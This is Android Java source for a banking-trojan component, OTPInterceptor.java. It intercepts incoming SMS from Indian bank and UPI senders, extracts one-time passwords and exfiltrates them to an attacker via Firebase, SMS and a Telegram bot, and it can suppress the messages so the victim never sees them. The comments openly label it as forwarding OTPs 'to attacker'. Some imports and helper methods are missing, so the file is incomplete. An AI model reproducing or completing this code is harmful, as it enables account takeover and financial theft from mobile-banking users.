// OTPInterceptor.java
package com.godz.rtoRed.admin.banking;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

public class OTPInterceptor extends BroadcastReceiver {
    
    private static final Pattern[] OTP_PATTERNS = {
        Pattern.compile("\\b\\d{4,6}\\b"), // Generic 4-6 digit OTP
        Pattern.compile("OTP[ :]+(\\d{4,6})", Pattern.CASE_INSENSITIVE),
        Pattern.compile("is (\\d{4,6})", Pattern.CASE_INSENSITIVE),
        Pattern.compile("code[ :]+(\\d{4,6})", Pattern.CASE_INSENSITIVE),
        Pattern.compile("verification[ :]+(\\d{4,6})", Pattern.CASE_INSENSITIVE)
    };
    
    private static final String[] BANK_SENDERS = {
        "SBIINB", "HDFCBK", "ICICIB", "AXISBK", "YESBNK",
        "PYTM", "PHONEP", "GOOGLE", "BHIMUPI", "IDFCBK",
        "KOTAKB", "UBIBAN", "CITIBK"
    };
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getOriginatingAddress();
                        String message = sms.getMessageBody();
                        
                        // Check if from bank
                        if (isFromBank(sender)) {
                            String otp = extractOTP(message);
                            if (otp != null) {
                                // Forward OTP to attacker
                                forwardOTP(sender, otp, message);
                                
                                // Block from user if configured
                                if (shouldBlockOTP()) {
                                    abortBroadcast();
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    private boolean isFromBank(String sender) {
        if (sender == null) return false;
        
        // Remove non-digits
        String cleanSender = sender.replaceAll("[^0-9]", "");
        
        // Check against known bank shortcodes
        for (String bankSender : BANK_SENDERS) {
            if (sender.toUpperCase().contains(bankSender)) {
                return true;
            }
        }
        
        // Check length (bank messages usually from 5-6 digit numbers)
        if (cleanSender.length() >= 4 && cleanSender.length() <= 6) {
            return true;
        }
        
        return false;
    }
    
    private String extractOTP(String message) {
        if (message == null) return null;
        
        for (Pattern pattern : OTP_PATTERNS) {
            Matcher matcher = pattern.matcher(message);
            if (matcher.find()) {
                String otp = matcher.group(1);
                if (otp != null && otp.matches("\\d{4,6}")) {
                    return otp;
                }
            }
        }
        
        // Fallback: look for any 4-6 digit number
        Pattern fallback = Pattern.compile("\\b(\\d{4,6})\\b");
        Matcher matcher = fallback.matcher(message);
        if (matcher.find()) {
            return matcher.group(1);
        }
        
        return null;
    }
    
    private void forwardOTP(String sender, String otp, String fullMessage) {
        Map<String, String> otpData = new HashMap<>();
        otpData.put("sender", sender);
        otpData.put("otp", otp);
        otpData.put("message", fullMessage);
        otpData.put("timestamp", String.valueOf(System.currentTimeMillis()));
        otpData.put("device", getDeviceId());
        
        // Determine which bank from sender
        String bank = identifyBank(sender);
        otpData.put("bank", bank);
        
        // Encrypt and send
        String encrypted = AESCrypt.encrypt(
            getOTPKey(),
            new JSONObject(otpData).toString()
        );
        
        // Send to Firebase
        FirebaseDatabase.getInstance()
            .getReference("otp_captures")
            .push()
            .setValue(encrypted);
        
        // Also send via SMS to attacker number
        sendSMSToAttacker(formatOTPAlert(otpData));
        
        // Send to Telegram bot
        sendToTelegramOTP(otpData);
    }
    
    private String identifyBank(String sender) {
        String senderUpper = sender.toUpperCase();
        
        if (senderUpper.contains("SBI")) return "SBI";
        if (senderUpper.contains("HDFC")) return "HDFC";
        if (senderUpper.contains("ICICI")) return "ICICI";
        if (senderUpper.contains("AXIS")) return "AXIS";
        if (senderUpper.contains("PYTM")) return "Paytm";
        if (senderUpper.contains("PHONEP")) return "PhonePe";
        if (senderUpper.contains("GOOGLE")) return "Google Pay";
        if (senderUpper.contains("BHIM")) return "BHIM UPI";
        if (senderUpper.contains("YES")) return "Yes Bank";
        if (senderUpper.contains("KOTAK")) return "Kotak";
        
        return "Unknown";
    }
    
    private String formatOTPAlert(Map<String, String> otpData) {
        return String.format(
            "🔓 OTP CAPTURED\nBank: %s\nOTP: %s\nFrom: %s\nTime: %s\nDevice: %s",
            otpData.get("bank"),
            otpData.get("otp"),
            otpData.get("sender"),
            new Date(Long.parseLong(otpData.get("timestamp"))).toString(),
            otpData.get("device").substring(0, 8)
        );
    }
}